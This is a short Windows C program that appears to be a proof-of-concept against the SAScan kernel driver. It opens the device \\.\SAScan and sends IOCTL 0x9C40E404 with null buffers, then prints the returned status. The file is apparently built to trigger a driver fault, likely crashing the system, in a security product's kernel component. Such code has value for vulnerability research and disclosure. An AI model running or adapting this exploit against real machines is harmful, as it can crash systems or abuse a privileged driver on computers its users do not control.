#pragma warning(disable: 4005)

#include <windows.h>
#include <strsafe.h>
#include <ntstatus.h>
#include "ntos.h"

NTSTATUS CallDriver(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG IoControlCode,
    _In_opt_ PVOID InputBuffer,
    _In_opt_ ULONG InputBufferLength,
    _In_opt_ PVOID OutputBuffer,
    _In_opt_ ULONG OutputBufferLength)
{
    BOOL bResult = FALSE;
    IO_STATUS_BLOCK ioStatus;

    return NtDeviceIoControlFile(DeviceHandle,
        NULL,
        NULL,
        NULL,
        &ioStatus,
        IoControlCode,
        InputBuffer,
        InputBufferLength,
        OutputBuffer,
        OutputBufferLength);

}

int main()
{
    NTSTATUS ntStatus;

    HANDLE deviceHandle = CreateFile(TEXT("\\\\.\\SAScan"),
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        0,
        NULL);

    if (deviceHandle == INVALID_HANDLE_VALUE) {
        printf_s("[!] Unable to open device\r\n");
#ifndef _DEBUG
        return -1;
#endif
    }
    else {
        printf_s("[+] SAScan device opened\r\n");
    }

    ntStatus = CallDriver(deviceHandle,
        0x9C40E404,
        NULL,
        0,
        NULL,
        0);

    printf_s("[~] (NTSTATUS 0x%lx)\r\n", ntStatus);

    system("pause");

    CloseHandle(deviceHandle);
}
